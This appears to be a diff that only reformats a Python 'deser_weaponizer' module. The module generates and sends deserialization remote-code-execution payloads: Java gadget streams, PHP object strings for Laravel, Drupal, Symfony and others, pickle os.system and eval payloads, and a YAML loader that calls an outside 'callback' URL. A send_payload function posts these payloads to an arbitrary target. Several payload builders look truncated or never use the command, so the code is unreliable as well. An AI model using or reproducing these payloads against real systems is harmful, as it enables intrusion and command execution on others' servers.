@@ -13,10 +13,12 @@ logger = get_logger("deser_weaponizer")
 # Java deserialization payloads (pure Python, no ysoserial needed)
 # ---------------------------------------------------------------------------
 
+
 def _java_write_utf(out: bytearray, s: str):
     b = s.encode("utf-8")
     out.extend(struct.pack(">H", len(b)))
     out.extend(b)
+
 
 def _java_write_string(out: bytearray, s: str):
     if s is None:
@@ -25,10 +27,12 @@ def _java_write_string(out: bytearray, s: str):
         out.extend(b"\x74")
         _java_write_utf(out, s)
 
+
 def _java_write_blockdata(out: bytearray, data: bytes):
     out.append(0x77)
     out.extend(struct.pack(">B", len(data)))
     out.extend(data)
+
 
 def _java_write_classdesc(out: bytearray, classname: str, uid: int):
     out.append(0x72)
@@ -38,8 +42,10 @@ def _java_write_classdesc(out: bytearray, classname: str, uid: int):
     out.extend(b"\x00\x00")  # no fields
     out.append(0x78)  # blockdata end
 
+
 def _java_tc_null(out: bytearray):
     out.append(0x70)
+
 
 def build_java_urldns(url: str) -> bytes:
     out = bytearray()
@@ -47,7 +53,7 @@ def build_java_urldns(url: str) -> bytes:
     out.append(0x73)  # TC_OBJECT
     out.append(0x72)  # TC_CLASSDESC
     _java_write_utf(out, "java.net.URL")
-    out.extend(struct.pack(">Q", 0x6c526c5a4b9e72e7))  # serialVersionUID
+    out.extend(struct.pack(">Q", 0x6C526C5A4B9E72E7))  # serialVersionUID
     out.extend(b"\x02\x00\x01")  # fields count
     out.append(0x74)  # String
     _java_write_utf(out, "hashCode")
@@ -58,20 +64,23 @@ def build_java_urldns(url: str) -> bytes:
     _java_write_blockdata(out, url.encode())
     return bytes(out)
 
+
 def build_java_runtime_exec(cmd: str) -> bytes:
     out = bytearray()
     out.extend(b"\xac\xed\x00\x05")
     out.append(0x73)
     out.append(0x72)
     _java_write_utf(out, "java.lang.Runtime")
-    out.extend(struct.pack(">Q", 0x440e37a3fcb32783))
+    out.extend(struct.pack(">Q", 0x440E37A3FCB32783))
     out.extend(b"\x02\x00\x00")
     out.append(0x78)
     out.append(0x73)
     out.append(0x72)
     _java_write_utf(out, "java.lang.String")
-    out.extend(struct.pack(">Q", 0x6ce1c6f44f8b9e67))
-    out.extend(b"\x02\x00\x01\x00\x03\x76\x61\x6c\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78")
+    out.extend(struct.pack(">Q", 0x6CE1C6F44F8B9E67))
+    out.extend(
+        b"\x02\x00\x01\x00\x03\x76\x61\x6c\x00\x12\x4c\x6a\x61\x76\x61\x2f\x6c\x61\x6e\x67\x2f\x53\x74\x72\x69\x6e\x67\x3b\x78"
+    )
     out.append(0x70)
     return bytes(out)
 
@@ -82,7 +91,7 @@ def build_java_processbuilder(cmd: str) -> bytes:
     out.append(0x73)
     out.append(0x72)
     _java_write_utf(out, "java.lang.ProcessBuilder")
-    out.extend(struct.pack(">Q", 0x467e2c9c8b9437e1))
+    out.extend(struct.pack(">Q", 0x467E2C9C8B9437E1))
     out.extend(b"\x02\x00\x01")
     _java_write_utf(out, "cmd")
     out.append(0x78)
@@ -110,22 +119,32 @@ def build_java_commonscollections(cmd: str) -> bytes:
     payload += b"\x78\x70"
     return payload
 
+
 # ---------------------------------------------------------------------------
 # PHP deserialization payloads
 # ---------------------------------------------------------------------------
 
+
 def build_php_rce(name: str = "PHPExecPopen", cmd: str = "id") -> str:
     return 'O:18:"PHPExecPopen":1:{s:4:"cmd";s:%d:"%s";}' % (len(cmd), cmd)
 
+
 def build_php_laravel_rce(cmd: str = "id") -> str:
-    return 'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"*handlerResolver";s:%d:"%s";}s:8:"*event";s:6:"dummy";}' % (len(cmd), cmd)
+    return (
+        'O:40:"Illuminate\\Broadcasting\\PendingBroadcast":2:{s:9:"*events";O:25:"Illuminate\\Bus\\Dispatcher":1:{s:16:"*handlerResolver";s:%d:"%s";}s:8:"*event";s:6:"dummy";}'
+        % (len(cmd), cmd)
+    )
+
 
 def build_php_codeigniter_rce(cmd: str = "id") -> str:
     return 'O:12:"CI_Controller":1:{s:4:"cmd";s:%d:"%s";}' % (len(cmd), cmd)
 
 
 def build_php_thinkphp_rce(cmd: str = "id") -> str:
-    return 'O:44:"Think\\Database\\Query":1:{s:5:"*app";O:44:"Think\\Database\\Connection":1:{s:7:"*config";a:1:{s:6:"type";s:%d:"%s";}}}' % (len(cmd), cmd)
+    return (
+        'O:44:"Think\\Database\\Query":1:{s:5:"*app";O:44:"Think\\Database\\Connection":1:{s:7:"*config";a:1:{s:6:"type";s:%d:"%s";}}}'
+        % (len(cmd), cmd)
+    )
 
 
 def build_php_wordpress_rce(cmd: str = "id") -> str:
@@ -133,67 +152,93 @@ def build_php_wordpress_rce(cmd: str = "id") -> str:
 
 
 def build_php_drupal_rce(cmd: str = "id") -> str:
-    return 'O:46:"Drupal\\Core\\Site\\Settings":1:{s:12:"*databases";a:1:{s:6:"default";a:1:{s:7:"default";a:2:{s:4:"host";s:%d:"%s";s:4:"port";s:2:"33";}}}}' % (len(cmd), cmd)
+    return (
+        'O:46:"Drupal\\Core\\Site\\Settings":1:{s:12:"*databases";a:1:{s:6:"default";a:1:{s:7:"default";a:2:{s:4:"host";s:%d:"%s";s:4:"port";s:2:"33";}}}}'
+        % (len(cmd), cmd)
+    )
 
 
 def build_php_symfony_rce(cmd: str = "id") -> str:
-    return 'O:46:"Symfony\\Component\\HttpFoundation\\InputBag":1:{s:5:"*params";a:1:{s:3:"cmd";s:%d:"%s";}}' % (len(cmd), cmd)
+    return (
+        'O:46:"Symfony\\Component\\HttpFoundation\\InputBag":1:{s:5:"*params";a:1:{s:3:"cmd";s:%d:"%s";}}'
+        % (len(cmd), cmd)
+    )
 
 
 def build_python_rce_subprocess(cmd: str = "id") -> bytes:
     import pickle
+
     class RCE:
         def __reduce__(self):
             import subprocess
+
             return (subprocess.check_output, (["sh", "-c", cmd],))
+
     return pickle.dumps(RCE())
 
 
 def build_python_rce_eval(cmd: str = "id") -> bytes:
     import pickle
+
     class RCE:
         def __reduce__(self):
             return (eval, (f'__import__("os").system("{cmd}")',))
+
     return pickle.dumps(RCE())
 
 
 def build_ruby_rce(cmd: str = "id") -> str:
-    'Gem::Installer.new.i({})'.format(cmd)
+    "Gem::Installer.new.i({})".format(cmd)
     return "BAhJBUxvYWRlckBvYmplY3Q6FkdhbTo6R2VtOjpJbnN0YWxsZXJ7AjpAc3RhdHVzczs6B2V4aXQ7Cg=="
 
 
 def build_nodejs_rce(cmd: str = "id") -> str:
     import json
+
     payload = {"rce": f"require('child_process').execSync('{cmd}').toString()"}
     return json.dumps(payload)
+
 
 # ---------------------------------------------------------------------------
 # Python pickle payloads
 # ---------------------------------------------------------------------------
 
+
 def build_pickle_rce(cmd: str = "id") -> bytes:
     import pickle
+
     class RCE:
         def __reduce__(self):
             import os
+
             return (os.system, (cmd,))
+
     return pickle.dumps(RCE())
+
 
 # ---------------------------------------------------------------------------
 # .NET ViewState / BinaryFormatter payloads (basic)
 # ---------------------------------------------------------------------------
 
+
 def build_dotnet_rce(cmd: str = "id") -> str:
     import base64
+
     payload = b"\x00\x01\x00\x00\x00\xff\xff\xff\xff\x01\x00\x00\x00\x00\x00\x00\x00"
     return base64.b64encode(payload).decode()
+
 
 # ---------------------------------------------------------------------------
 # YAML deserialization
 # ---------------------------------------------------------------------------
 
+
 def build_yaml_rce(cmd: str = "id") -> str:
-    return "!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL [\"http://callback/%s\"]]]]" % cmd
+    return (
+        '!!javax.script.ScriptEngineManager [!!java.net.URLClassLoader [[!!java.net.URL ["http://callback/%s"]]]]'
+        % cmd
+    )
+
 
 # ---------------------------------------------------------------------------
 # Weaponizer
@@ -222,10 +267,13 @@ ALL_PAYLOADS: Dict[str, callable] = {
 }
 
 
-def generate_payload(technique: str = "java_urldns", cmd: str = "id",
-                     callback_url: str = "") -> Dict:
+def generate_payload(
+    technique: str = "java_urldns", cmd: str = "id", callback_url: str = ""
+) -> Dict:
     if technique not in ALL_PAYLOADS:
-        return {"error": "Unknown technique: %s. Available: %s" % (technique, list(ALL_PAYLOADS.keys()))}
+        return {
+            "error": "Unknown technique: %s. Available: %s" % (technique, list(ALL_PAYLOADS.keys()))
+        }
     try:
         if technique in ("java_urldns", "java_jndi_ldap"):
             raw = ALL_PAYLOADS[technique](url=callback_url or "http://burpcollaborator.net")
@@ -270,10 +318,15 @@ def generate_payload(technique: str = "java_urldns", cmd: str = "id",
     }
 
 
-def send_payload(url: str, param: str, technique: str = "java_urldns",
-                 cmd: str = "id", callback_url: str = "",
-                 sess: Optional[requests.Session] = None,
-                 timeout: float = 10.0) -> Dict:
+def send_payload(
+    url: str,
+    param: str,
+    technique: str = "java_urldns",
+    cmd: str = "id",
+    callback_url: str = "",
+    sess: Optional[requests.Session] = None,
+    timeout: float = 10.0,
+) -> Dict:
     if sess is None:
         sess = requests.Session()
         sess.verify = settings.verify_ssl
@@ -293,8 +346,11 @@ def send_payload(url: str, param: str, technique: str = "java_urldns",
         elif technique.startswith("nodejs_"):
             r = sess.post(url, json={"rce": cmd}, headers=headers, timeout=timeout)
         else:
-            r = sess.post("%s%s%s=%s" % (url, sep, param, pld["raw"] if isinstance(pld["raw"], str) else pld["b64"]),
-                         timeout=timeout)
+            r = sess.post(
+                "%s%s%s=%s"
+                % (url, sep, param, pld["raw"] if isinstance(pld["raw"], str) else pld["b64"]),
+                timeout=timeout,
+            )
         result["sent"] = True
         result["status"] = r.status_code
         result["response_preview"] = r.text[:200]
@@ -306,8 +362,7 @@ def send_payload(url: str, param: str, technique: str = "java_urldns",
     return result
 
 
-def check(url: str = None, param: str = None, sess=None,
-          timeout: float = 10.0) -> Dict:
+def check(url: str = None, param: str = None, sess=None, timeout: float = 10.0) -> Dict:
     result = {
         "vulnerable": False,
         "payloads_generated": len(ALL_PAYLOADS),
